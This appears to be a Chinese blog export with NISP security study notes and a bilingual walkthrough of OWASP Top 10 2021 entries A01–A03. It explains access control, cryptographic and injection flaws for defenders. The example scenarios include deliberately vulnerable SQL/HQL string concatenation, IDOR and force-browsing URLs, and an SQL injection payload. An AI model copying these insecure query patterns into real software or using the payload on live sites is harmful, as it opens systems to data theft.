<h3 id="系统对用户的身份单向鉴别"><a href="#系统对用户的身份单向鉴别" class="headerlink" title="系统对用户的身份单向鉴别"></a>系统对用户的身份单向鉴别</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%93%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8D%95%E5%90%91%E9%89%B4%E5%88%AB.png" alt="个人网银系统的单向鉴别"></p>
<blockquote>
<p>账号、密码、和验证码成功登陆个人网银系统，系统对用户身份的的单向鉴别。</p>
</blockquote>
<h3 id="基于实体所知的鉴别威胁"><a href="#基于实体所知的鉴别威胁" class="headerlink" title="基于实体所知的鉴别威胁"></a>基于实体所知的鉴别威胁</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%9F%BA%E4%BA%8E%E5%AE%9E%E4%BD%93%E6%89%80%E7%9F%A5%E7%9A%84%E9%89%B4%E5%88%AB%E5%A8%81%E8%83%81.png" alt="基于实体所知的鉴别威胁"></p>
<blockquote>
<p>基于实体所知的鉴别威胁：暴力破解攻击，窃听攻击，重放攻击</p>
</blockquote>
<h3 id="证书管理器的调用"><a href="#证书管理器的调用" class="headerlink" title="证书管理器的调用"></a>证书管理器的调用</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E8%B0%83%E7%94%A8.png" alt="证书管理器的调用"></p>
<blockquote>
<p>cmd打开certmgr.msc</p>
</blockquote>
<h3 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/IGMP%E5%8D%8F%E8%AE%AE.png" alt="IGMP协议"></p>
<blockquote>
<p>IGMP协议：Internet组织管理协议 ，位于TCP&#x2F;IP协议的网络层</p>
</blockquote>
<h3 id="TCP网络安全协议"><a href="#TCP网络安全协议" class="headerlink" title="TCP网络安全协议"></a>TCP网络安全协议</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/TCP%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE.png" alt="TCP网络安全协议"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/TCP%E5%8D%8F%E8%AE%AE%E6%89%80%E5%9C%A8%E5%B1%82.png" alt="TCP协议所在层"></p>
<blockquote>
<p>IPSec工作再网络层</p>
<p>PP2P和L2TP工作在数据链路层</p>
<p>SSL工作在传输层。</p>
</blockquote>
<h3 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE.png" alt="应用层协议"></p>
<blockquote>
<p>应用层协议：HTTP协议，FTP协议，Telnet</p>
<p>传输层协议：UDP协议，TCP协议</p>
</blockquote>
<h3 id="交换机的物理分层方式"><a href="#交换机的物理分层方式" class="headerlink" title="交换机的物理分层方式"></a>交换机的物理分层方式</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E7%89%A9%E7%90%86%E5%88%86%E5%B1%82%E6%96%B9%E5%BC%8F.png" alt="交换机的物理分层方式"></p>
<blockquote>
<p>交换机的物理分层方式：接入层、汇聚层、核心层</p>
</blockquote>
<h3 id="网闸-物理隔离系统"><a href="#网闸-物理隔离系统" class="headerlink" title="网闸(物理隔离系统)"></a>网闸(物理隔离系统)</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E9%97%B8(%E7%89%A9%E7%90%86%E9%9A%94%E7%A6%BB%E7%B3%BB%E7%BB%9F).png" alt="网闸(物理隔离系统)"></p>
<blockquote>
<p>网闸（物理隔离网络）：外部处理单元+内部处理单元+冲裁处理单元</p>
</blockquote>
<h3 id="局域网中MAC-介质访问控制子层"><a href="#局域网中MAC-介质访问控制子层" class="headerlink" title="局域网中MAC(介质访问控制子层)"></a>局域网中MAC(介质访问控制子层)</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%B8%ADMAC(%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%AD%90%E5%B1%82).png" alt="局域网中MAC(介质访问控制子层)"></p>
<blockquote>
<p>在局域网中，MAC指的是介质访问控制子层</p>
</blockquote>
<h3 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91.png" alt="无线局域网"></p>
<h3 id="网卡作用OSI七层的位置"><a href="#网卡作用OSI七层的位置" class="headerlink" title="网卡作用OSI七层的位置"></a>网卡作用OSI七层的位置</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E5%8D%A1%E4%BD%9C%E7%94%A8OSI%E4%B8%83%E5%B1%82%E7%9A%84%E4%BD%8D%E7%BD%AE.png" alt="网卡作用OSI七层的位置"></p>
<h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><h3 id><a href="#" class="headerlink" title></a><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0.png" alt="哈希函数"></h3><blockquote>
<p>哈希函数：单向散列函数，它可以将任意有限长度信息映射为固定长度的值</p>
</blockquote>
]]></content>
      <categories>
        <category>certificate</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>nisp</tag>
      </tags>
  </entry>
  <entry>
    <title>Open new world</title>
    <url>/2024/01/13/Open-new-world/</url>
    <content><![CDATA[<h2 id="OPEN-NEW-WORLD"><a href="#OPEN-NEW-WORLD" class="headerlink" title="OPEN NEW WORLD"></a>OPEN NEW WORLD</h2><p>敬请T期待！</p>
<p>路漫漫其修远兮，吾将上下而求索！</p>
<p>​																–《离骚》屈原</p>
<p>杨宪益先生 译：<br>The way was long, and wrapped in gloom did seem,<br>As I urged on to seek my vanished dream.</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Hope_flag</tag>
      </tags>
  </entry>
  <entry>
    <title>OWASP_Top_10_2021</title>
    <url>/2024/11/19/OWASP-Top-10-2021/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="A01-Broken-Access-Control-访问控制失效"><a href="#A01-Broken-Access-Control-访问控制失效" class="headerlink" title="A01 Broken Access Control       访问控制失效"></a><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">A01 Broken Access Control       </a>访问控制失效</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user’s limits. Common access control vulnerabilities include:</p>
<blockquote>
<p>访问控制强制实施策略，以便用户无法超出其预期权限执行操作。故障通常会导致未经授权的信息泄露、修改或销毁所有数据，或执行超出用户限制的业务功能。常见的访问控制漏洞包括：</p>
</blockquote>
<ul>
<li><p>Violation of the principle of least privilege or deny by default, where access should only be granted for particular capabilities, roles, or users, but is available to anyone.</p>
<blockquote>
<p>违反了最低权限原则或默认拒绝原则，其中只应为特定功能、角色或用户授予访问权限，但任何人都可以访问。</p>
</blockquote>
</li>
<li><p>Bypassing access control checks by modifying the URL (parameter tampering or force browsing), internal application state, or the HTML page, or by using an attack tool modifying API requests.</p>
<blockquote>
<p>通过修改 URL（参数篡改或强制浏览）、内部应用程序状态或 HTML 页面，或使用修改 API 请求的攻击工具来绕过访问控制检查。</p>
</blockquote>
</li>
<li><p>Permitting viewing or editing someone else’s account, by providing its unique identifier (insecure direct object references)</p>
<blockquote>
<p>通过提供其唯一标识符（不安全的直接对象引用）来允许查看或编辑他人的帐户</p>
</blockquote>
</li>
<li><p>Accessing API with missing access controls for POST, PUT and DELETE.</p>
<blockquote>
<p>访问缺少 POST、PUT 和 DELETE 访问控制的 API。</p>
</blockquote>
</li>
<li><p>Elevation of privilege. Acting as a user without being logged in or acting as an admin when logged in as a user.</p>
<blockquote>
<p>特权提升。在未登录的情况下以用户身份行事，或在以用户身份登录时以管理员身份行事。</p>
</blockquote>
</li>
<li><p>Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token, or a cookie or hidden field manipulated to elevate privileges or abusing JWT invalidation.</p>
<blockquote>
<p>元数据操作，例如重放或篡改 JSON Web 令牌 （JWT） 访问控制令牌，或者操纵 Cookie 或隐藏字段以提升权限或滥用 JWT 失效。</p>
</blockquote>
</li>
<li><p>CORS misconfiguration allows API access from unauthorized&#x2F;untrusted origins.</p>
<blockquote>
<p>CORS 配置错误允许从未经授权&#x2F;不受信任的来源访问 API。</p>
</blockquote>
</li>
<li><p>Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.</p>
<blockquote>
<p>强制以未经身份验证的用户身份浏览到经过身份验证的页面，或以标准用户身份浏览到特权页面。</p>
</blockquote>
</li>
</ul>
<h3 id="How-to-Prevent"><a href="#How-to-Prevent" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><p>Access control is only effective in trusted server-side code or server-less API, where the attacker cannot modify the access control check or metadata.</p>
<blockquote>
<p>访问控制仅在受信任的服务器端代码或无服务器 API 中有效，攻击者无法修改访问控制检查或元数据。</p>
</blockquote>
<ul>
<li><p>Except for public resources, deny by default.</p>
<blockquote>
<p>除公共资源外，默认为 deny。</p>
</blockquote>
</li>
<li><p>Implement access control mechanisms once and re-use them throughout the application, including minimizing Cross-Origin Resource Sharing (CORS) usage.</p>
<blockquote>
<p>实施一次访问控制机制，然后在整个应用程序中重复使用它们，包括最大限度地减少跨域资源共享 （CORS） 的使用。</p>
</blockquote>
</li>
<li><p>Model access controls should enforce record ownership rather than accepting that the user can create, read, update, or delete any record.</p>
<blockquote>
<p>模型访问控制应强制实施记录所有权，而不是接受用户可以创建、读取、更新或删除任何记录。</p>
</blockquote>
</li>
<li><p>Unique application business limit requirements should be enforced by domain models.</p>
<blockquote>
<p>域模型应强制实施唯一的应用程序业务限制要求。</p>
</blockquote>
</li>
<li><p>Disable web server directory listing and ensure file metadata (e.g., .git) and backup files are not present within web roots.</p>
<blockquote>
<p>禁用 Web 服务器目录列表，并确保 Web 根目录中不存在文件元数据（例如 .git）和备份文件。</p>
</blockquote>
</li>
<li><p>Log access control failures, alert admins when appropriate (e.g., repeated failures).</p>
<blockquote>
<p>记录访问控制失败，在适当的时候提醒管理员（例如，重复失败）。</p>
</blockquote>
</li>
<li><p>Rate limit API and controller access to minimize the harm from automated attack tooling.</p>
<blockquote>
<p>对 API 和控制器访问进行速率限制，以最大限度地减少自动攻击工具的危害。</p>
</blockquote>
</li>
<li><p>Stateful session identifiers should be invalidated on the server after logout. Stateless JWT tokens should rather be short-lived so that the window of opportunity for an attacker is minimized. For longer lived JWTs it’s highly recommended to follow the OAuth standards to revoke access.</p>
<blockquote>
<p>注销后，应在服务器上使有状态会话标识符失效。无状态 JWT 令牌的生存期应该是短暂的，以便将攻击者的机会窗口降至最低。对于寿命较长的 JWT，强烈建议遵循 OAuth 标准来撤销访问权限。</p>
</blockquote>
</li>
</ul>
<p>Developers and QA staff should include functional access control unit and integration tests.</p>
<blockquote>
<p>开发人员和 QA 人员应包括功能访问控制单元和集成测试。</p>
</blockquote>
<h3 id="Example-Attack-Scenarios"><a href="#Example-Attack-Scenarios" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1:</strong> The application uses unverified data in a SQL call that is accessing account information:</p>
<blockquote>
<p><strong>场景 #1：</strong>应用程序在访问账户信息的 SQL 调用中使用未经验证的数据：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pstmt.setString(1, request.getParameter(&quot;acct&quot;));</span><br><span class="line">ResultSet results = pstmt.executeQuery( );</span><br></pre></td></tr></table></figure>

<p>An attacker simply modifies the browser’s ‘acct’ parameter to send whatever account number they want. If not correctly verified, the attacker can access any user’s account.</p>
<blockquote>
<p>攻击者只需修改浏览器的 ‘acct’ 参数即可发送他们想要的任何账号。如果未正确验证，攻击者可以访问任何用户的帐户。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/app/accountInfo?acct=notmyacct</span><br></pre></td></tr></table></figure>

<p><strong>Scenario #2:</strong> An attacker simply forces browses to target URLs. Admin rights are required for access to the admin page.</p>
<blockquote>
<p><strong>场景 #2：</strong>攻击者只是强制浏览目标 URL。需要管理员权限才能访问管理员页面。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/app/getappInfo</span><br><span class="line">https://example.com/app/admin_getappInfo</span><br></pre></td></tr></table></figure>

<p>If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.</p>
<blockquote>
<p>如果未经身份验证的用户可以访问任一页面，则这是一个缺陷。如果非管理员可以访问管理员页面，则这是一个缺陷。</p>
</blockquote>
<h2 id="A02-Cryptographic-Failures-加密失败"><a href="#A02-Cryptographic-Failures-加密失败" class="headerlink" title="A02 Cryptographic Failures       加密失败"></a><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">A02 Cryptographic Failures       </a>加密失败</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>The first thing is to determine the protection needs of data in transit and at rest. For example, passwords, credit card numbers, health records, personal information, and business secrets require extra protection, mainly if that data falls under privacy laws, e.g., EU’s General Data Protection Regulation (GDPR), or regulations, e.g., financial data protection such as PCI Data Security Standard (PCI DSS). For all such data:</p>
<blockquote>
<p>首先要确定传输中数据和静态数据的保护需求。例如，密码、信用卡号、健康记录、个人信息和商业秘密需要额外保护，主要是如果这些数据属于隐私法，例如欧盟的通用数据保护条例 （GDPR），或法规，例如 PCI 数据安全标准 （PCI DSS） 等金融数据保护。对于所有此类数据：</p>
</blockquote>
<ul>
<li><p>Is any data transmitted in clear text? This concerns protocols such as HTTP, SMTP, FTP also using TLS upgrades like STARTTLS. External internet traffic is hazardous. Verify all internal traffic, e.g., between load balancers, web servers, or back-end systems.</p>
<blockquote>
<p>是否有任何数据以明文形式传输？这涉及 HTTP、SMTP、FTP 等协议，也使用 STARTTLS 等 TLS 升级。外部 Internet 流量是危险的。验证所有内部流量，例如负载均衡器、Web 服务器或后端系统之间的流量。</p>
</blockquote>
</li>
<li><p>Are any old or weak cryptographic algorithms or protocols used either by default or in older code?</p>
<blockquote>
<p>默认情况下或在较旧的代码中使用了任何旧的或较弱的加密算法或协议？</p>
</blockquote>
</li>
<li><p>Are default crypto keys in use, weak crypto keys generated or re-used, or is proper key management or rotation missing? Are crypto keys checked into source code repositories?</p>
<blockquote>
<p>是否使用了默认加密密钥，生成或重复使用了弱加密密钥，或者是否缺少适当的密钥管理或轮换？加密密钥是否签入源代码存储库？</p>
</blockquote>
</li>
<li><p>Is encryption not enforced, e.g., are any HTTP headers (browser) security directives or headers missing?</p>
<blockquote>
<p>是否未强制加密，例如，是否缺少任何 HTTP 标头（浏览器）安全指令或标头？</p>
</blockquote>
</li>
<li><p>Is the received server certificate and the trust chain properly validated?</p>
<blockquote>
<p>收到的服务器证书和信任链是否经过正确验证？</p>
</blockquote>
</li>
<li><p>Are initialization vectors ignored, reused, or not generated sufficiently secure for the cryptographic mode of operation? Is an insecure mode of operation such as ECB in use? Is encryption used when authenticated encryption is more appropriate?</p>
<blockquote>
<p>初始化向量是否被忽略、重复使用或生成的加密操作模式不够安全？是否正在使用 ECB 等不安全的操作模式？当经过身份验证的加密更合适时，是否使用加密？</p>
</blockquote>
</li>
<li><p>Are passwords being used as cryptographic keys in absence of a password base key derivation function?</p>
<blockquote>
<p>在没有密码基密钥派生功能的情况下，密码是否被用作加密密钥？</p>
</blockquote>
</li>
<li><p>Is randomness used for cryptographic purposes that was not designed to meet cryptographic requirements? Even if the correct function is chosen, does it need to be seeded by the developer, and if not, has the developer over-written the strong seeding functionality built into it with a seed that lacks sufficient entropy&#x2F;unpredictability?</p>
<blockquote>
<p>随机数是否用于并非旨在满足加密要求的加密目的？即使选择了正确的函数，它是否需要由开发人员进行种子设定，如果不需要，则开发人员是否用缺乏足够熵&#x2F;不可预测性的种子覆盖了其内置的强种子设定功能？</p>
</blockquote>
</li>
<li><p>Are deprecated hash functions such as MD5 or SHA1 in use, or are non-cryptographic hash functions used when cryptographic hash functions are needed?</p>
<blockquote>
<p>是否正在使用已弃用的哈希函数（如 MD5 或 SHA1），或者当需要加密哈希函数时是否使用非加密哈希函数？</p>
</blockquote>
</li>
<li><p>Are deprecated cryptographic padding methods such as PKCS number 1 v1.5 in use?</p>
<blockquote>
<p>是否正在使用已弃用的加密填充方法，例如 PKCS 编号 1 v1.5？</p>
</blockquote>
</li>
<li><p>Are cryptographic error messages or side channel information exploitable, for example in the form of padding oracle attacks?</p>
<blockquote>
<p>加密错误消息或侧信道信息是否可被利用，例如以填充预言机攻击的形式？</p>
</blockquote>
</li>
</ul>
<h3 id="How-to-Prevent-1"><a href="#How-to-Prevent-1" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><p>Do the following, at a minimum, and consult the references:</p>
<blockquote>
<p>至少执行以下操作，并查阅参考资料：</p>
</blockquote>
<ul>
<li><p>Classify data processed, stored, or transmitted by an application. Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs.</p>
<blockquote>
<p>对应用程序处理、存储或传输的数据进行分类。根据隐私法律、法规要求或业务需求确定哪些数据是敏感的。</p>
</blockquote>
</li>
<li><p>Don’t store sensitive data unnecessarily. Discard it as soon as possible or use PCI DSS compliant tokenization or even truncation. Data that is not retained cannot be stolen.</p>
<blockquote>
<p>不要不必要地存储敏感数据。尽快丢弃它或使用符合 PCI DSS 的标记化甚至截断。未保留的数据不会被盗。</p>
</blockquote>
</li>
<li><p>Make sure to encrypt all sensitive data at rest.</p>
<blockquote>
<p>确保对所有静态敏感数据进行加密。</p>
</blockquote>
</li>
<li><p>Ensure up-to-date and strong standard algorithms, protocols, and keys are in place; use proper key management.</p>
<blockquote>
<p>确保最新且强大的标准算法、协议和密钥到位;使用适当的密钥管理。</p>
</blockquote>
</li>
<li><p>Encrypt all data in transit with secure protocols such as TLS with forward secrecy (FS) ciphers, cipher prioritization by the server, and secure parameters. Enforce encryption using directives like HTTP Strict Transport Security (HSTS).</p>
<blockquote>
<p>使用安全协议加密传输中的所有数据，例如使用前向保密 （FS） 密码的 TLS、服务器的密码优先级和安全参数。使用 HTTP 严格传输安全 （HSTS） 等指令强制加密。</p>
</blockquote>
</li>
<li><p>Disable caching for response that contain sensitive data.</p>
<blockquote>
<p>对包含敏感数据的响应禁用缓存。</p>
</blockquote>
</li>
<li><p>Apply required security controls as per the data classification.</p>
<blockquote>
<p>根据数据分类应用所需的安全控制。</p>
</blockquote>
</li>
<li><p>Do not use legacy protocols such as FTP and SMTP for transporting sensitive data.</p>
<blockquote>
<p>请勿使用 FTP 和 SMTP 等传统协议来传输敏感数据。</p>
</blockquote>
</li>
<li><p>Store passwords using strong adaptive and salted hashing functions with a work factor (delay factor), such as Argon2, scrypt, bcrypt or PBKDF2.</p>
<blockquote>
<p>使用具有工作因子（延迟因子）的强自适应和加盐哈希函数（例如 Argon2、scrypt、bcrypt 或 PBKDF2）存储密码。</p>
</blockquote>
</li>
<li><p>Initialization vectors must be chosen appropriate for the mode of operation. For many modes, this means using a CSPRNG (cryptographically secure pseudo random number generator). For modes that require a nonce, then the initialization vector (IV) does not need a CSPRNG. In all cases, the IV should never be used twice for a fixed key.</p>
<blockquote>
<p>必须选择适合操作模式的初始化向量。对于许多模式，这意味着使用 CSPRNG（加密安全伪随机数生成器）。对于需要 nonce 的模式，则初始化向量 （IV） 不需要 CSPRNG。在所有情况下，对于固定键，IV 绝不应使用两次。</p>
</blockquote>
</li>
<li><p>Always use authenticated encryption instead of just encryption.</p>
<blockquote>
<p>始终使用经过身份验证的加密，而不仅仅是加密。</p>
</blockquote>
</li>
<li><p>Keys should be generated cryptographically randomly and stored in memory as byte arrays. If a password is used, then it must be converted to a key via an appropriate password base key derivation function.</p>
<blockquote>
<p>密钥应以加密方式随机生成，并以字节数组的形式存储在内存中。如果使用了密码，则必须通过适当的密码基密钥派生功能将其转换为密钥。</p>
</blockquote>
</li>
<li><p>Ensure that cryptographic randomness is used where appropriate, and that it has not been seeded in a predictable way or with low entropy. Most modern APIs do not require the developer to seed the CSPRNG to get security.</p>
<blockquote>
<p>确保在适当的情况下使用加密随机性，并且没有以可预测的方式或低熵进行种子植入。大多数现代 API 不需要开发人员为 CSPRNG 设定种子即可获得安全性。</p>
</blockquote>
</li>
<li><p>Avoid deprecated cryptographic functions and padding schemes, such as MD5, SHA1, PKCS number 1 v1.5 .</p>
<blockquote>
<p>避免使用已弃用的加密函数和填充方案，例如 MD5、SHA1、PKCS 编号 1 v1.5 。</p>
</blockquote>
</li>
<li><p>Verify independently the effectiveness of configuration and settings.</p>
<blockquote>
<p>独立验证配置和设置的有效性。</p>
</blockquote>
</li>
</ul>
<h3 id="Example-Attack-Scenarios-1"><a href="#Example-Attack-Scenarios-1" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1</strong>: An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically decrypted when retrieved, allowing a SQL injection flaw to retrieve credit card numbers in clear text.</p>
<blockquote>
<p><strong>场景 #1</strong>：应用程序使用自动数据库加密来加密数据库中的信用卡号。但是，此数据在检索时会自动解密，从而允许 SQL 注入缺陷以明文形式检索信用卡号。</p>
</blockquote>
<p><strong>Scenario #2</strong>: A site doesn’t use or enforce TLS for all pages or supports weak encryption. An attacker monitors network traffic (e.g., at an insecure wireless network), downgrades connections from HTTPS to HTTP, intercepts requests, and steals the user’s session cookie. The attacker then replays this cookie and hijacks the user’s (authenticated) session, accessing or modifying the user’s private data. Instead of the above they could alter all transported data, e.g., the recipient of a money transfer.</p>
<blockquote>
<p><strong>场景 #2</strong>：网站没有对所有页面使用或强制使用 TLS，或者支持弱加密。攻击者监控网络流量（例如，在不安全的无线网络上），将连接从 HTTPS 降级为 HTTP，拦截请求，并窃取用户的会话 Cookie。然后，攻击者重放此 cookie 并劫持用户的（经过身份验证的）会话，访问或修改用户的私人数据。相反，他们可以更改所有传输的数据，例如，汇款的接收者。</p>
</blockquote>
<p><strong>Scenario #3</strong>: The password database uses unsalted or simple hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes. Hashes generated by simple or fast hash functions may be cracked by GPUs, even if they were salted.</p>
<blockquote>
<p><strong>场景 #3</strong>：密码数据库使用未加盐或简单的哈希来存储每个人的密码。文件上传缺陷允许攻击者检索密码数据库。所有未加盐的哈希值都可以使用预先计算的哈希值的彩虹表来公开。由简单或快速哈希函数生成的哈希可能会被 GPU 破解，即使它们被加盐。</p>
</blockquote>
<h2 id="A03-Injection注入"><a href="#A03-Injection注入" class="headerlink" title="A03 Injection注入"></a><a href="https://owasp.org/Top10/A03_2021-Injection/">A03 Injection</a>注入</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>An application is vulnerable to attack when:</p>
<blockquote>
<p>在以下情况下，应用程序容易受到攻击：</p>
</blockquote>
<ul>
<li><p>User-supplied data is not validated, filtered, or sanitized by the application.</p>
<blockquote>
<p>应用程序不会验证、过滤或清理用户提供的数据。</p>
</blockquote>
</li>
<li><p>Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.</p>
<blockquote>
<p>没有上下文感知转义的动态查询或非参数化调用直接在解释器中使用。</p>
</blockquote>
</li>
<li><p>Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.</p>
<blockquote>
<p>恶意数据在对象关系映射 （ORM） 搜索参数中用于提取其他敏感记录。</p>
</blockquote>
</li>
<li><p>Hostile data is directly used or concatenated. The SQL or command contains the structure and malicious data in dynamic queries, commands, or stored procedures.</p>
<blockquote>
<p>恶意数据被直接使用或连接。SQL 或命令包含动态查询、命令或存储过程中的结构和恶意数据。</p>
</blockquote>
</li>
</ul>
<p>Some of the more common injections are SQL, NoSQL, OS command, Object Relational Mapping (ORM), LDAP, and Expression Language (EL) or Object Graph Navigation Library (OGNL) injection. The concept is identical among all interpreters. Source code review is the best method of detecting if applications are vulnerable to injections. Automated testing of all parameters, headers, URL, cookies, JSON, SOAP, and XML data inputs is strongly encouraged. Organizations can include static (SAST), dynamic (DAST), and interactive (IAST) application security testing tools into the CI&#x2F;CD pipeline to identify introduced injection flaws before production deployment.</p>
<blockquote>
<p>一些更常见的注入是 SQL、NoSQL、OS 命令、对象关系映射 （ORM）、LDAP 和表达式语言 （EL） 或对象图导航库 （OGNL） 注入。这个概念在所有解释器中都是相同的。源代码审查是检测应用程序是否容易受到注入的最佳方法。强烈建议对所有参数、标头、URL、Cookie、JSON、SOAP 和 XML 数据输入进行自动测试。组织可以将静态 （SAST）、动态 （DAST） 和交互式 （IAST） 应用程序安全测试工具纳入 CI&#x2F;CD 管道，以便在生产部署之前识别引入的注入缺陷。</p>
</blockquote>
<h3 id="How-to-Prevent-2"><a href="#How-to-Prevent-2" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><p>Preventing injection requires keeping data separate from commands and queries:</p>
<blockquote>
<p>防止注入需要将数据与命令和查询分开：</p>
</blockquote>
<ul>
<li><p>The preferred option is to use a safe API, which avoids using the interpreter entirely, provides a parameterized interface, or migrates to Object Relational Mapping Tools (ORMs).</p>
<blockquote>
<p>首选选项是使用安全的 API，这样可以避免使用 interpreter 提供参数化接口，或者 迁移到 Object Relational Mapping Tools （ORM）。<br><strong>Note:</strong> Even when parameterized, stored procedures can still introduce SQL injection if PL&#x2F;SQL or T-SQL concatenates queries and data or executes hostile data with EXECUTE IMMEDIATE or exec().<br><strong>注意：</strong>即使参数化，存储过程仍可以引入 SQL 注入（如果 PL&#x2F;SQL 或 T-SQL 连接查询和数据），或者 使用 EXECUTE IMMEDIATE 或 exec（） 执行恶意数据。</p>
</blockquote>
</li>
<li><p>Use positive server-side input validation. This is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications.</p>
<blockquote>
<p>使用积极的服务器端输入验证。这并不是一个完全的防御措施，因为许多应用程序需要特殊字符，例如文本区域或移动应用程序的 API。</p>
</blockquote>
</li>
<li><p>For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.</p>
<blockquote>
<p>对于任何残差动态查询，请使用 该解释器的特定转义语法。<br><strong>Note:</strong> SQL structures such as table names, column names, and so on cannot be escaped, and thus user-supplied structure names are dangerous. This is a common issue in report-writing software.<br><strong>注意：</strong>SQL 结构，例如表名、列名等 无法转义，因此用户提供的结构名称是 危险。这是报告编写软件中的常见问题。</p>
</blockquote>
</li>
<li><p>Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.</p>
<blockquote>
<p>在查询中使用 LIMIT 和其他 SQL 控件，以防止在 SQL 注入的情况下大量泄露记录。</p>
</blockquote>
</li>
</ul>
<h3 id="Example-Attack-Scenarios-2"><a href="#Example-Attack-Scenarios-2" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1:</strong> An application uses untrusted data in the construction of the following vulnerable SQL call:</p>
<blockquote>
<p><strong>场景 #1：</strong>应用程序在构造以下易受攻击的 SQL 调用时使用不受信任的数据：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String query = &quot;SELECT \* FROM accounts WHERE custID=&#x27;&quot; + request.getParameter(&quot;id&quot;) + &quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p><strong>Scenario #2:</strong> Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)):</p>
<blockquote>
<p><strong>场景 #2：</strong>同样，应用程序对框架的盲目信任可能会导致查询仍然容易受到攻击（例如，Hibernate 查询语言 （HQL））：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Query HQLQuery = session.createQuery(&quot;FROM accounts WHERE custID=&#x27;&quot; + request.getParameter(&quot;id&quot;) + &quot;&#x27;&quot;);</span><br></pre></td></tr></table></figure>

<p>In both cases, the attacker modifies the ‘id’ parameter value in their browser to send: ‘ UNION SLEEP(10);–. For example:</p>
<blockquote>
<p>在这两种情况下，攻击者都会修改浏览器中的 ‘id’ 参数值以发送： ‘ UNION SLEEP（10）;–.例如：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/app/accountView?id=&#x27; UNION SELECT SLEEP(10);--</span><br></pre></td></tr></table></figure>

<p>This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify or delete data or even invoke stored procedures.</p>
<blockquote>
<p>这将更改两个查询的含义，以返回 accounts 表中的所有记录。更危险的攻击可能会修改或删除数据，甚至调用存储过程。</p>
</blockquote>
